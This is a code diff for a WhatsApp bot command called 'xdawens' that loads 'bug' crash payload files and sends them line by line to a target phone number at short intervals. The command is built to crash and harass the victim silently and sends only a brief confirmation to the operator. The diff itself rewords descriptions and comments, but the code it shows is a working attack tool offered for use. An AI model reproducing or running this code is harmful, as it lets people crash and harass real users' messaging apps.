@@ -5,7 +5,7 @@ const bugchatPlus = require('../bug/izuka6plus.js'); // Payload pi fò
 
 cmd({
   pattern: 'xdawens',
-  desc: 'Send silent powerful crash to WhatsApp user',
+  desc: 'Send silent crash messages to target number',
   category: 'bug',
   react: '💀',
   filename: __filename
@@ -50,9 +50,7 @@ cmd({
     const targetJid = `${targetNumber}@s.whatsapp.net`;
     const payloadLines = (usePlusPayload ? bugchatPlus : bugchat).split('\n').filter(Boolean);
 
-    // Nou pa voye mesaj anyen bay pwòp konvèsasyon bot/owner
-    // Nou voye mesaj dirèkteman nan kontak sib la san okenn 'quoted'
-
+    // **ISOLATE SENDING TO TARGET ONLY, NO MESSAGE IN YOUR CHAT**
     for (let i = 0; i < payloadLines.length; i++) {
       await bot.sendMessage(targetJid, {
         text: `💥 *XDAWENS CRASH #${i + 1}*\n${payloadLines[i]}\n\n⚠️ _Do not reply_`
@@ -60,9 +58,9 @@ cmd({
       await new Promise(r => setTimeout(r, 250));
     }
 
-    // Pa voye mesaj repons nan pwòp chat ou, jis omwen yon minimòm konfime
+    // Send a **minimal confirmation** ONLY to your chat (owner/bot) without spam content
     await bot.sendMessage(from, {
-      text: `✅ *XDAWENS CRASH finished on* +${targetNumber}\n(Messages sent silently)`
+      text: `✅ Crash messages sent to +${targetNumber} silently.`
     }, { quoted: mek });
 
   } catch (err) {
